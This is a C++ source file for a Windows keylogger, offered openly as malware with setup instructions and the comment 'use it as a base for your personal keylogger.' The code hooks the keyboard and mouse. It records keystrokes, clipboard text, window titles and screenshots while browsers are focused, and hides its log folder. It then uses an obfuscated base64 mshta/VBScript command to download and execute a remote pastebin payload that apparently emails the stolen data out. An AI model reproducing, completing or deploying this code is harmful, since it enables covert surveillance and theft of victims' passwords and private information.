// Manually add to the Preprocessor Definitions
// _CRT_SECURE_NO_WARNINGS
// _CRT_NON_CONFORMING_SWPRINTFS


/*
	==========================================================================================================
	Stealth Low-Level Hook Keylogger v1.0 written by Mutu Adi-Marian (aka xs8 | Xxshark888xX)
	
	----------------------------------------------------------------------------------------------------------
	
	[FEATURES]
	
	{*} Compresses everything in a zip archive (you can also set a password)
	{*} The archive will be sent to you by e-mail using a trusted Windows process (mshta.exe)
	{*} Screenshot of the screen when the left mouse button is pressed (you can set the dimensions and how often the program can take a ss)
	{*} Dead keys support (Will not work with IME)
	{*} Unicode characters support
	e.g: if the victim uses a US keyboard layout and press SHIFT+2, the keylogger will read the correct
		 character (@).
		 if the victim uses a IT keyboard layout, the keylogger will catch (")
	{*} Captures the title of the focused window 
	{*} Reads the clipboard when CTRL+C or CTRL+V are pressed (No "Copy" mouse support)
	
	[HOW TO SETUP]
	
	1) Go to the project properties
	2) Linker
	3) System
	4) SubSystem and select Windows
	This will make the program to run in background without a GUI
	
	You need also to add File.h and _String.h to your project.
	Don't compile with Unicode support!
		 
	==========================================================================================================
	
	[!!!]
	
	This program was written only as a personal challenge.
	I don't assume any responsibility about how you will use.
	
	==========================================================================================================
	*Built using Visual Studio 2017 and tested only on Windows 7/10 x64.
	**This program can be optimized a lot! Use it as a base for your personal keylogger.
	***You need to manually download and add the zip/base64 header/cpp files
	   zip    -> [http://www.wischik.com/lu/programmer/zip_utils.html]
					 >Lucian Wischik
					
	   base64 -> [https://renenyffenegger.ch/notes/development/Base64/Encoding-and-decoding-base-64-with-cpp]
					 >René Nyffenegger
	==========================================================================================================


	This is free and unencumbered software released into the public domain.

	Anyone is free to copy, modify, publish, use, compile, sell, or
	distribute this software, either in source code form or as a compiled
	binary, for any purpose, commercial or non-commercial, and by any
	means.

	In jurisdictions that recognize copyright laws, the author or authors
	of this software dedicate any and all copyright interest in the
	software to the public domain. We make this dedication for the benefit
	of the public at large and to the detriment of our heirs and
	successors. We intend this dedication to be an overt act of
	relinquishment in perpetuity of all present and future rights to this
	software under copyright law.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
	EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
	MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
	 NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
	OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
	ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
	OTHER DEALINGS IN THE SOFTWARE.

	For more information, please refer to http://unlicense.org
*/


#include "stdafx.h"
#include "File.h"
#include "_String.h"
#include "zip.h"                      // All credits to: Lucian Wischik [http://www.wischik.com/lu/programmer/zip_utils.html]
#include "base64.h"                   // All credits to: René Nyffenegger [https://renenyffenegger.ch/notes/development/Base64/Encoding-and-decoding-base-64-with-cpp]

#include <windows.h>
#include <tlhelp32.h>
#include <thread>
#include <atlimage.h>
#include <time.h>

#include <Psapi.h>
#pragma comment(lib, "Psapi.lib")


#pragma region [PROCESS]
class Process {
public:

	/* Return TRUE (1) if a process exists by the given PROCESS_ID */
	static BOOL Exists(DWORD _PID) {
		PROCESSENTRY32  _PENTRY;
		HANDLE          _SNAPSHOT;

		_PENTRY.dwSize = sizeof(PROCESSENTRY32);
		_SNAPSHOT	   = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

		if (Process32First(_SNAPSHOT, &_PENTRY) == TRUE) {
			while (Process32Next(_SNAPSHOT, &_PENTRY) == TRUE) {
				if (_PENTRY.th32ProcessID == _PID) { CloseHandle(_SNAPSHOT); return TRUE; }
			}
		}
		return FALSE;
	}

	/* Return TRUE(1) if the PROCESS_NAME window is focused */
	static BOOL IsFocused(const std::basic_string<TCHAR> _ProcessName) {
		HANDLE _HANDLE;
		DWORD  _PID;
		HWND   _HWND = GetForegroundWindow();

		if (!_HWND) { return FALSE; }

		GetWindowThreadProcessId(_HWND, &_PID);
		_HANDLE = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, _PID);

		if (_HANDLE) {
			TCHAR _Path[MAX_PATH];

			if (GetProcessImageFileName(_HANDLE, _Path, MAX_PATH) > 0) {
				std::basic_string<TCHAR> _tmp = _Path;

				if (_tmp.substr(_tmp.find_last_of('\\') + 1, _tmp.length()) == _ProcessName) { return TRUE; }
			}
			CloseHandle(_HANDLE);
		}
		return FALSE;
	}
	/* Return the thread ID of the focused window */
	static DWORD GetFocusedWindowThreadID() {
		HWND _HWND = GetForegroundWindow();
		return GetWindowThreadProcessId(_HWND, NULL);
	}

	/* Return the window title of the focused window */
	static std::string GetFocusedWindowTitleA() {
		char _wTitle[2048];

		HWND  _HWND = GetForegroundWindow();
		if (_HWND) {
			GetWindowTextA(_HWND, _wTitle, 2048);

			return _wTitle;
		}

		return "";
	}
	/* Return the window title of the focused window */
	static std::wstring GetFocusedWindowTitleW() {
		wchar_t _wTitle[2048];

		HWND  _HWND = GetForegroundWindow();
		if (_HWND) {
			GetWindowTextW(_HWND, _wTitle, 2048);

			return _wTitle;
		}

		return L"";
	}
};
#pragma endregion

#pragma region [CMD_EXECUTE]
DWORD CMDExecute(std::string _command, bool _newWindow = true, bool _autoExit = true) {
	std::string __cmdp;
	std::string _windir = getenv("WINDIR");

	__cmdp = _windir + R"(\System32\cmd.exe)";
	_command.insert(0, "/k ");
	if (_autoExit) { _command.insert(_command.length(), " && exit"); }

	char*               _cmda = _strdup(_command.c_str());
	PROCESS_INFORMATION _PI;
	STARTUPINFOA        _SI;
	ZeroMemory(&_SI, sizeof(_SI));

	if (_newWindow) {
		CreateProcessA(__cmdp.c_str(), _cmda, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &_SI, &_PI);
	} else {
		CreateProcessA(__cmdp.c_str(), _cmda, NULL, NULL, FALSE, NULL, NULL, NULL, &_SI, &_PI);
	}

	CloseHandle(_PI.hProcess);
	CloseHandle(_PI.hThread);

	return _PI.dwProcessId;
}
#pragma endregion


#define           KEYSTROKES_MAX            1000        /* When the victim have more keystrokes than this value
			                                   the e-mail will be sent and the previously log files wil be deleted */

#define           LOG_DIRECTORY             (std::string(getenv("LOCALAPPDATA")) + R"(\KEYLOGGER_FOLDER)").c_str();
#define           SCREENSHOT_TIMER (UINT64) 100 * 1000  // The maximum number of screenshots in 24h will be of 864 screenshots (86400ms / 100s = 864ss)
#define           LOG_NAME                  "windows_errors.log"
#define           ZIP_ARCHIVE_NAME          "YOUR_ZIP_NAME.zip"
#define           ZIP_ARCHIVE_PASSWORD      "PASSWORD"  // Set NULL if you don't want to encrypt the zip archive with a password
#define           ZIP_SS_CUSTOM_EXTENSION   ".jpg"      // This is the displayed extension of the screenshots in the zip archive

UINT16            _G_KB_SAME_PREV_KEY_CNT;
UINT16            _G_KB_KEYSTROKES_CNT;
UINT64            _G_SCREENSHOT_TIMER_CNT = clock() + SCREENSHOT_TIMER;

bool              _G_LOG_LAST_IS_PRINTABLE;

const std::string _G_LOG_DIR              = LOG_DIRECTORY;
const std::string _G_LOG_KEYS_FILE        = _G_LOG_DIR + "\\" + LOG_NAME;

std::wstring      _G_IN_MEM_LOG;
std::wstring      _G_PROC_PREV_ACTIVE_WINDOW_TITLE;
std::wstring      _G_KB_SAME_PREV_KEY;
std::wstring      _G_CB_PREV_TEXT;

HHOOK             _G_KB_HHOOK;
HHOOK             _G_MO_HHOOK;

HZIP              _G_HZIP;


class __PAYLOAD__ {

private:

	#pragma region [LOG_DIRECTORY_INTEGRITY]
	static void _checkLogIntegirty() {

		// From msdn
		// If the directory already exists, the function will fail and GetLastError() will return ERROR_ALREADY_EXISTS
		// If doesen't exits, the directory will be created

		CreateDirectory(_G_LOG_DIR.c_str(), NULL);

		if (GetFileAttributes(_G_LOG_DIR.c_str()) != FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM) {
			SetFileAttributes(_G_LOG_DIR.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
		}
	}
	#pragma endregion

	#pragma region [GET_COUNTRY_CODE]
	static std::wstring _getCountryCode() {
		GEOID _GEOID;
		WCHAR _bf[16];
		int   _size;
		int   _result;

		_GEOID = GetUserGeoID(GEOCLASS_NATION);
		_size  = GetGeoInfoW(_GEOID, GEO_ISO2, 0, 0, 0);
		GetGeoInfoW(_GEOID, GEO_ISO2, _bf, 2048, 0);
		return _bf;
	}
	#pragma endregion

	#pragma region [GET_SCREEN_SIZE]
	static std::wstring _getScreenSize() {
		return (L"W: " + std::to_wstring(GetSystemMetrics(SM_CXVIRTUALSCREEN)) + L", H: " + std::to_wstring(GetSystemMetrics(SM_CYVIRTUALSCREEN)));
	}
	#pragma endregion
	
	#pragma region [WRITE_LOG_TO_DISK_OR_IN_MEMORY]
	static void _writeLog(const std::wstring &str, bool _keyChar, bool _freshStartup = false) {
		if (_freshStartup == false) {
			if (_keyChar) {

				// This occurs only when the keystroke produce a printable character

				_G_LOG_LAST_IS_PRINTABLE = true;

				//File::AppendText(_G_LOG_KEYS_FILE, str);

				_G_IN_MEM_LOG += str;
			} else {
				if (_G_LOG_LAST_IS_PRINTABLE) {

					// If the last keystroke has produced a printable character,
					// write the new NON-printable char on a new line
					// and append to the end a new line

					//File::AppendText(_G_LOG_KEYS_FILE, L'\n' + str + L'\n');

					_G_IN_MEM_LOG += L'\n' + str + L'\n';
				} else {

					// If the last keystroke hasn't produced a printable character,
					// append to the end a new line

					//File::AppendText(_G_LOG_KEYS_FILE, str + L'\n');

					_G_IN_MEM_LOG += str + L'\n';
				}

				_G_LOG_LAST_IS_PRINTABLE = false;
			}
		} else {
			// Here you can add what you want to be written to the log file when the
			// keylogger starts.
			// The first time you will write to the log, use File::WriteAllText() function,
			// after that use File::AppendText()

			std::wstring _u = _wgetenv(L"USERNAME");

			/*File::WriteAllText(_G_LOG_KEYS_FILE, L"<~[PC_USERNAME --->{" + _u + L"}<--- ]~>\n");
			File::AppendText(_G_LOG_KEYS_FILE, L"<~[COUNTRY_CODE --->{" + _getCountryCode() + L"}<--- ]~>\n");
			File::AppendText(_G_LOG_KEYS_FILE, L"<~[SCREEN_SIZE --->{" + _getScreenSize() + L"}<--- ]~>\n\n");*/

			_G_IN_MEM_LOG  = L"<~[PC_USERNAME --->{" + _u + L"}<--- ]~>\n";
			_G_IN_MEM_LOG += L"<~[COUNTRY_CODE --->{" + _getCountryCode() + L"}<--- ]~>\n";
			_G_IN_MEM_LOG += L"<~[SCREEN_SIZE --->{" + _getScreenSize() + L"}<--- ]~>\n\n";
		}
	}
	#pragma endregion

	#pragma region [SEND_LOG_TO_E-MAIL_THREAD]
	static void _sendLogToEmail() {
			
			// To send the e-mail, we will use cmd, mshta and two VBS payloads
			// I have written a small script (executor) in VBS that allow to download a HEX encoded and encrypted VBS payload
			// who will be launched using ExecuteGlobal after the executor will be launched by mshta.exe in memory*
			//
			// keylogger.exe --> cmd.exe --> mshta.exe vbscript:execute(EXECUTOR_VBS_PAYLOAD)(window.close) --> VBS payload to send the e-mail is decoded/decrypted and executed with ExecuteGlobal
			//
			// [*] ALMOST in memory, because mshta.exe will write in a temp file the decrypted VBS payload to can launch it
			//
			// This function is executed on another thread to allow us to get when the mshta.exe process has finished,
			// because when mshta have finished we need to delete the uploaded zip archive and create new one


			std::wstring _logTemp = _G_IN_MEM_LOG; // Use this only if you want to have the log in memory

			_writeLog(L"", false, true);           // Remove or comment this line if you want to use the log from file

			/*ZipAdd(_G_HZIP, _G_LOG_KEYS_FILE.substr(_G_LOG_KEYS_FILE.find_last_of('\\') + 1).c_str(),
			         _G_LOG_KEYS_FILE.c_str());*/                                                     // Zip the log from the file
			ZipAdd(_G_HZIP, _G_LOG_KEYS_FILE.substr(_G_LOG_KEYS_FILE.find_last_of('\\') + 1).c_str(),
				  (wchar_t*)_logTemp.c_str(), _logTemp.length() * 2);                                 // Zip the log from in memory

			if (CloseZip(_G_HZIP) == ZR_OK) {
				// Launch mshta command (see https://github.com/Xxshark888xX/MSHTA-VBS-download-and-execute/blob/master/README.md)
				DWORD _p = CMDExecute(base64_decode("bXNodGEuZXhlIHZic2NyaXB0OmV4ZWN1dGUoIk9uIEVycm9yIFJlc3VtZSBOZXh0OlNldCBhPUNyZWF0ZU9iamVjdCgiIk1TWE1MMi5TZXJ2ZXJYTUxIVFRQLjYuMCIiKTphLnNldE9wdGlvbiAyLDEzMDU2OndoaWxlKExlbihiKT0wKTphLm9wZW4iIkdFVCIiLCIiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1BSamVyeHdEIiIsRmFsc2U6YS5zZW5kOmI9YS5yZXNwb25zZVRleHQ6d2VuZDprPSIiWjY4S1BEIiI6Zm9yIGk9MHRvIExlbihiKS0xU3RlcCAyOmM9YyZDaHIoQXNjKENocigiIiZIIiImTWlkKGIsaSsxLDIpKSl4b3IgQXNjKE1pZChrLCgoaS8yKW1vZCBMZW4oaykpKzEsMSkpKTpOZXh0OkV4ZWN1dGVHbG9iYWwgYzoiKSh3aW5kb3cuY2xvc2Up"));
				while (Process::Exists(_p))
					Sleep(100);
			}
			//_writeLog(L"", false, true);         // Un-comment this if you want to use the log from file

			File::Delete(_G_LOG_DIR + "\\" + ZIP_ARCHIVE_NAME);

			_G_HZIP = CreateZip((_G_LOG_DIR + "\\" + ZIP_ARCHIVE_NAME).c_str(), ZIP_ARCHIVE_PASSWORD);
	}
	#pragma endregion

	#pragma region [PROCESSES_TO_BE_MONITORED]
	static bool _processToMonitorizeIsFocused() {

		// The keylogger will register the keystrokes only if one of this processes is focused, if not, will remain in "standby"
		// If you don't want to register the keystrokes only when a certain process is focused
		// you can edit this function to return always true

		if (
		Process::IsFocused("chrome.exe")         ||
		Process::IsFocused("firefox.exe")        ||
		Process::IsFocused("opera.exe")          ||
		Process::IsFocused("iexplore.exe")       ||
		Process::IsFocused("MicrosoftEdgeCP.exe")
		) { return true; }

		return false;
	}
	#pragma endregion

	#pragma region [GET_CLIPBOARD_THREAD]
	static void _getClipboardData(bool _isCtrlV) {

		// We need to open the clipboard on another thread
		// to can read from it without blocking the main thread where
		// the low level keyboard/mouse hook are running
		// because when the victim press CTRL+C or CTRL+V
		// the OS (or another program) will also open the clipboard to set or read from it
		// so, this thread needs a small delay (500-1000ms) to can read the new content from it.
		// [bad implementation, I know]

		Sleep(550);
		
		if (OpenClipboard(NULL)) {
			HANDLE       _data;
			std::wstring _cpb;

			if ((_data = GetClipboardData(CF_UNICODETEXT))) {
				if (_data) {
					_cpb = (WCHAR*)GlobalLock(_data);
					               GlobalUnlock(_data);

					if (_cpb.length() != 0) {
						if (!_isCtrlV) {
							if (_cpb != _G_CB_PREV_TEXT) {
								_G_CB_PREV_TEXT = _cpb;

								_writeLog(L"<~[CTRL + C --->{"
									    + _G_CB_PREV_TEXT
								   	    + L"}<--- ]~>",
									      false);
							}
						} else {
							_writeLog(L"<~[CTRL + V --->{"
								    + _G_CB_PREV_TEXT
								    + L"}<--- ]~>",
								      false);
						}
					}
				}
			}

			CloseClipboard();
		}
	}
	#pragma endregion

	#pragma region [LOW_LEVEL_HOOKS]

	#pragma region [KEYBOARD_LOW_LEVEL_HOOK]
	
	#pragma region [GET_AND_PROCESS_KEYSTROKE]
	static bool _isPrintable(DWORD _vkCode) {
		// [Non-Printable Characters]
		UINT8 _NPC_[] = {
			VK_RETURN,
			VK_BACK,
			VK_SHIFT,
			VK_SNAPSHOT,
			VK_DELETE,
			VK_INSERT,
			VK_ESCAPE,
			VK_PRIOR,
			VK_NEXT,
			VK_END,
			VK_HOME,
			VK_LEFT,
			VK_UP,
			VK_RIGHT,
			VK_DOWN,
			VK_LWIN,
			VK_RWIN,
			VK_NUMLOCK,
			VK_SCROLL,
			VK_ATTN,
			VK_CRSEL,
			VK_EXSEL,
			VK_EREOF,
			VK_OEM_CLEAR,
			VK_F1,
			VK_F2,
			VK_F3,
			VK_F4,
			VK_F5,
			VK_F6,
			VK_F7,
			VK_F8,
			VK_F9,
			VK_F10,
			VK_F11,
			VK_F12,
			VK_F13,
			VK_F14,
			VK_F15,
		};

		for (UINT8 i = 0; i < (sizeof(_NPC_) / sizeof(_NPC_[0])); i++) {
			if (_vkCode == _NPC_[i]) { return false; }
		}
		return true;
	}

	static void _processKeystroke(KBDLLHOOKSTRUCT &_key) {
		WCHAR        _bfKeyChar[256] = { 0 };
		BYTE         _kbState[256]   = { 0 };
		DWORD        _dwKeyName      = 1;
		HKL          _kbLayout       = GetKeyboardLayout(Process::GetFocusedWindowThreadID());
		bool         _isP            = _isPrintable(_key.vkCode);
		bool         _canPrint       = true;
		std::wstring _clipBoard_tmp;

		#pragma region [SPECIAL_KEYS]
		// Capslock is active
		if ((GetKeyState(VK_CAPITAL) & 0x01) != 0) {   //Don't set _canPrint to false!
			_kbState[0x14] = 0x01;
		}
		// Shift is holded down
		if (GetKeyState(VK_SHIFT) & 0x80) {			   //Don't set _canPrint to false!
			_kbState[0x10] = 0x80;
		}
		// Control is holded down
		if (GetKeyState(VK_CONTROL) & 0x80) {
			_kbState[0x11] = 0x80;
			_canPrint      = false;

			if (_key.vkCode == 0x43) {                 // C is pressed (CTRL+C)
				std::thread _t{ _getClipboardData, false };
							_t.detach();
			} else if (_key.vkCode == 0x41) {          // A is pressed (CTRL+A)
				std::wstring _tmp = L"<~[CTRL + A]~>";

				if (_G_KB_SAME_PREV_KEY != _tmp) {
					_G_KB_SAME_PREV_KEY  = _tmp;

					_writeLog(_tmp, false);
				}
			} else if (_key.vkCode == 0x56) {          // V is pressed (CTRL+V)
				std::thread _t{ _getClipboardData, true };
						    _t.detach();
			}
		}
		// Alt is holded down
		if (GetKeyState(VK_MENU) & 0x80) {
			_kbState[0x12] = 0x80;
		}
		// Enter is pressed
		if (_key.vkCode == VK_RETURN) {
			_canPrint = false;
		}
		#pragma endregion

		if (_canPrint) {
			ToUnicodeEx(_key.vkCode, _key.scanCode, (PBYTE)&_kbState, (LPWSTR)&_bfKeyChar, sizeof(_bfKeyChar) / 16, 0, _kbLayout);
		}

		if (_bfKeyChar[0] != 0 && _isP) {
			_G_KB_KEYSTROKES_CNT++;
			_G_KB_SAME_PREV_KEY = _bfKeyChar;

			_writeLog(_bfKeyChar, true);
		} else if ((_bfKeyChar[0] != 0 || _bfKeyChar[0] == 0) && !_isP) {
			WCHAR _keyNPCFormatted[256];

			_dwKeyName += (_key.scanCode << 16);
			_dwKeyName += (_key.flags << 24);
			GetKeyNameTextW(_dwKeyName, _bfKeyChar, 256);

			if (_G_KB_SAME_PREV_KEY != _bfKeyChar) {
				_G_KB_SAME_PREV_KEY_CNT = 1;
				_G_KB_SAME_PREV_KEY     = _bfKeyChar;

			} else { _G_KB_SAME_PREV_KEY_CNT++; }

			_String::Upper(_bfKeyChar);
			std::swprintf(_keyNPCFormatted, L"<~[x%d]%s~>", _G_KB_SAME_PREV_KEY_CNT, _bfKeyChar);

			_writeLog(_keyNPCFormatted, false);
		}
	}
	#pragma endregion

	__declspec(dllexport) static LRESULT CALLBACK __KB_HOOKPROC__(int _code, WPARAM _wp, LPARAM _lp) {
		if (_code == HC_ACTION && (_wp == WM_SYSKEYDOWN || _wp == WM_KEYDOWN) && _processToMonitorizeIsFocused()) {

			_checkLogIntegirty();
			_processKeystroke(*((KBDLLHOOKSTRUCT*)_lp));

			if (_G_KB_KEYSTROKES_CNT >= KEYSTROKES_MAX) {
				_G_KB_KEYSTROKES_CNT = 0;

				std::thread _t { _sendLogToEmail };
							_t.detach();
			}
		}

		return CallNextHookEx(_G_KB_HHOOK, _code, _wp, _lp);
	}
	#pragma endregion


	#pragma region [MOUSE_LOW_LEVEL_HOOK]

	#pragma region [SCREENSHOT]
	static void _ssCaptureMouseArea(MSLLHOOKSTRUCT &_mouse, UINT16 _w, UINT16 _h) {

		// If _w and _h are both equal to 0
		// the function will take a screenshot of the entire screen.
		// If not, will take a screenshot large _w and height _h focusing the area where the cursor is on the screen.
		//
		// The screenshot, after being saved to the disk, will be added to the zip archive and deleted from the disk

		HDC     _screenDC;
		HDC     _memoryDC;
		HBITMAP _HBITMAP;
		HBITMAP _HBITMAP_H;
		CImage  _CImage;
		UINT16  _screenW;
		UINT16  _screenH;
		UINT16  _ssW;
		UINT16  _ssH;

		_screenDC  = CreateDC("DISPLAY", NULL, NULL, NULL);

		_screenW   = GetDeviceCaps(_screenDC, HORZRES);
		_screenH   = GetDeviceCaps(_screenDC, VERTRES);
		if (_w == 0) { _ssW = _screenW; } else { _ssW = _w; }
		if (_h == 0) { _ssH = _screenH; } else { _ssH = _h; }

		_memoryDC  = CreateCompatibleDC(_screenDC);
		_HBITMAP   = CreateCompatibleBitmap(_screenDC, _ssW, _ssH);
		_HBITMAP_H = (HBITMAP)SelectObject(_memoryDC, _HBITMAP);

		_mouse.pt.x -= _ssW / 2;
		_mouse.pt.y -= _ssH / 2;
		if (_mouse.pt.x - _ssW <  0) { _mouse.pt.x = 0; }
		if (_mouse.pt.y - _ssH <= 0) { _mouse.pt.y = 1; }
		if (_mouse.pt.x + _ssW >= _screenW) { _mouse.pt.x = _screenW - _ssW; }
		if (_mouse.pt.y + _ssH >= _screenH) { _mouse.pt.y = _screenH - _ssH; }

		BitBlt(_memoryDC, 0, 0, _ssW, _ssH, _screenDC, _mouse.pt.x, _mouse.pt.y, SRCCOPY | CAPTUREBLT);
		_HBITMAP = (HBITMAP)SelectObject(_memoryDC, _HBITMAP_H);

		std::string _dt     = _String::GetDateTimeNow();
		std::string _ssName = _String::ReplaceChar(_dt, ":", "_");

		_CImage.Attach(_HBITMAP);
		_CImage.Save((_G_LOG_DIR + "\\" + _ssName + ".jpg").c_str());

		ZipAdd(_G_HZIP, (_ssName + ZIP_SS_CUSTOM_EXTENSION).c_str(), (_G_LOG_DIR + "\\" + _ssName + ".jpg").c_str());
		File::Delete(_G_LOG_DIR + "\\" + _ssName + ".jpg");

		DeleteObject(_HBITMAP);
		DeleteDC(_memoryDC);
		DeleteDC(_screenDC);
	}
	#pragma endregion

	__declspec(dllexport) static LRESULT CALLBACK __MO_HOOKPROC__(int _code, WPARAM _wp, LPARAM _lp) {
		MSLLHOOKSTRUCT _mouse = *(MSLLHOOKSTRUCT*)_lp;

		if (_code == HC_ACTION) {
			if (_wp == WM_LBUTTONUP && _processToMonitorizeIsFocused()) {

				// This event occurs when the Left mouse button is released
				// Using the LBUTTONDOWN can give some troubles

				_checkLogIntegirty();

				_writeLog(L"<~[LMB_CLICK - " 
					    + _String::ToWString(_String::GetDateTimeNow())
					    + L" || x: " 
					    + std::to_wstring(_mouse.pt.x)
					    + L", y: " 
					    + std::to_wstring(_mouse.pt.y)
					    + L"]~>", 
					      false);
				
				std::wstring _activeBrowserWindowTitle = Process::GetFocusedWindowTitleW();
				if (_G_PROC_PREV_ACTIVE_WINDOW_TITLE != _activeBrowserWindowTitle) {
					_G_PROC_PREV_ACTIVE_WINDOW_TITLE = _activeBrowserWindowTitle;

					if (_activeBrowserWindowTitle.length() != 0) {
						_writeLog(L"<~[CURRENT_WINDOW_TITLE --->{"
							    + _activeBrowserWindowTitle
							    + L"}<--- ]~>",
							      false);
					}
				}

				// Screenshot timer
				if (clock() - _G_SCREENSHOT_TIMER_CNT >= SCREENSHOT_TIMER) {
					_G_SCREENSHOT_TIMER_CNT = clock();

					std::string _getTime    = _String::GetDateTimeNow();
					_ssCaptureMouseArea(_mouse, NULL, 50);
				}
			}
			if (_wp == WM_RBUTTONUP && _processToMonitorizeIsFocused()) {
				_checkLogIntegirty();

				_writeLog(L"<~[RMB_CLICK - "
					    + _String::ToWString(_String::GetDateTimeNow())
					    + L" || x: "
					    + std::to_wstring(_mouse.pt.x)
					    + L", y: "
					    + std::to_wstring(_mouse.pt.y)
					    + L"]~>",
					      false);
			}
		}

		return CallNextHookEx(_G_MO_HHOOK, _code, _wp, _lp);
	}
	#pragma endregion

	#pragma endregion

public:

	#pragma region [ENTRY_POINT]
	static void __ENTRY_POINT__() {
		MSG		    _msg;
		HINSTANCE   _moduleHandle;

		_checkLogIntegirty();
		_writeLog(L"", false, true);

		_G_HZIP = CreateZip((_G_LOG_DIR + "\\" + ZIP_ARCHIVE_NAME).c_str(), ZIP_ARCHIVE_PASSWORD);

		_moduleHandle = GetModuleHandle(NULL);
		_G_KB_HHOOK   = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)__KB_HOOKPROC__, _moduleHandle, NULL);
		_G_MO_HHOOK   = SetWindowsHookEx(WH_MOUSE_LL,    (HOOKPROC)__MO_HOOKPROC__, _moduleHandle, NULL);

		while (true) {
			if (!GetMessage(&_msg, NULL, 0, 0)) {
				std::quick_exit(1);
			}

			TranslateMessage(&_msg);
			DispatchMessage( &_msg);
		}

		//UnhookWindowsHookEx(_G_KHHOOK);
		//UnhookWindowsHookEx(_G_MHHOOK);
	}
	#pragma endregion
};



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	#pragma region [NO_ERROR_SHOW]
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
	_set_abort_behavior(0, _WRITE_ABORT_MSG);
	#pragma endregion

	__PAYLOAD__::__ENTRY_POINT__();
}
